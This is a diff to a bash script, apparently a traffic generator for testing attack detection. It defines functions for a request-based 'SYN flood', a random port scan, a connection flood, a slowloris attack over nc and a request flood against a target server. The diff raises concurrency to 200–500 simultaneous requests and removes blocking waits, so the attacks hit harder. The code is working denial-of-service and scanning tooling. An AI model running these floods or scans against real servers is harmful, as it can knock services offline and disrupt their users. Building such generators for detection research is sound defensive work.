@@ -122,47 +122,53 @@ normal_downloads() {
 
 attack_syn_flood() {
     local duration_sec="$1"
-    echo "  [Attack] SYN Flood (${duration_sec}s)..."
+    echo "  [Attack] SYN Flood (${duration_sec}s, 200 concurrent)..."
     local end_time=$((SECONDS + duration_sec))
     while [ $SECONDS -lt $end_time ]; do
-        for i in $(seq 1 20); do
-            curl -s -m 1 -o /dev/null "$BASE_URL/download/1k" 2>/dev/null &
+        for i in $(seq 1 200); do
+            curl -s -m 1 --connect-timeout 1 -o /dev/null "$BASE_URL/download/1k" 2>/dev/null &
         done
-        wait
+        sleep 0.2
+        wait -n 2>/dev/null || true
     done
+    wait 2>/dev/null
 }
 
 attack_port_scan() {
     local duration_sec="$1"
-    echo "  [Attack] Port Scan (${duration_sec}s)..."
+    echo "  [Attack] Port Scan (${duration_sec}s, 50 concurrent)..."
     local end_time=$((SECONDS + duration_sec))
     while [ $SECONDS -lt $end_time ]; do
-        for port in $(shuf -i 1-65535 -n 10 2>/dev/null || seq 1000 1010); do
-            (echo "" | nc -w 1 "$SERVER_IP" "$port" 2>/dev/null) &
+        for i in $(seq 1 50); do
+            local port=$((RANDOM % 64000 + 1024))
+            curl -s -m 1 --connect-timeout 1 -o /dev/null "http://$SERVER_IP:$port/" 2>/dev/null &
         done
-        wait
         sleep 0.1
+        wait -n 2>/dev/null || true
     done
+    wait 2>/dev/null
 }
 
 attack_connection_flood() {
     local duration_sec="$1"
-    echo "  [Attack] Connection Flood (${duration_sec}s)..."
+    echo "  [Attack] Connection Flood (${duration_sec}s, 300 concurrent)..."
     local end_time=$((SECONDS + duration_sec))
     while [ $SECONDS -lt $end_time ]; do
-        for i in $(seq 1 30); do
-            curl -s -m 5 -o /dev/null "$BASE_URL/download/100k" 2>/dev/null &
+        for i in $(seq 1 300); do
+            curl -s -m 5 --connect-timeout 2 -o /dev/null "$BASE_URL/download/100k" 2>/dev/null &
         done
-        wait
+        sleep 0.3
+        wait -n 2>/dev/null || true
     done
+    wait 2>/dev/null
 }
 
 attack_slowloris() {
     local duration_sec="$1"
-    echo "  [Attack] Slowloris (${duration_sec}s)..."
+    echo "  [Attack] Slowloris (${duration_sec}s, 100 connections)..."
 
     local pids=()
-    for i in $(seq 1 15); do
+    for i in $(seq 1 100); do
         (
             {
                 echo -n "GET /download/10m HTTP/1.1\r\nHost: $SERVER_IP\r\n"
@@ -175,7 +181,7 @@ attack_slowloris() {
             } | nc -w "$((duration_sec + 5))" "$SERVER_IP" "$HTTP_PORT" 2>/dev/null
         ) &
         pids+=($!)
-        sleep 0.2
+        sleep 0.05
     done
 
     sleep "$duration_sec"
@@ -188,14 +194,16 @@ attack_slowloris() {
 
 attack_request_flood() {
     local duration_sec="$1"
-    echo "  [Attack] Request Flood (${duration_sec}s)..."
+    echo "  [Attack] Request Flood (${duration_sec}s, 500 concurrent)..."
     local end_time=$((SECONDS + duration_sec))
     while [ $SECONDS -lt $end_time ]; do
-        for i in $(seq 1 50); do
-            curl -s -m 2 -o /dev/null "$BASE_URL/api/status" 2>/dev/null &
+        for i in $(seq 1 500); do
+            curl -s -m 2 --connect-timeout 1 -o /dev/null "$BASE_URL/api/status" 2>/dev/null &
         done
-        wait
+        sleep 0.2
+        wait -n 2>/dev/null || true
     done
+    wait 2>/dev/null
 }
 
 # ============================================================================
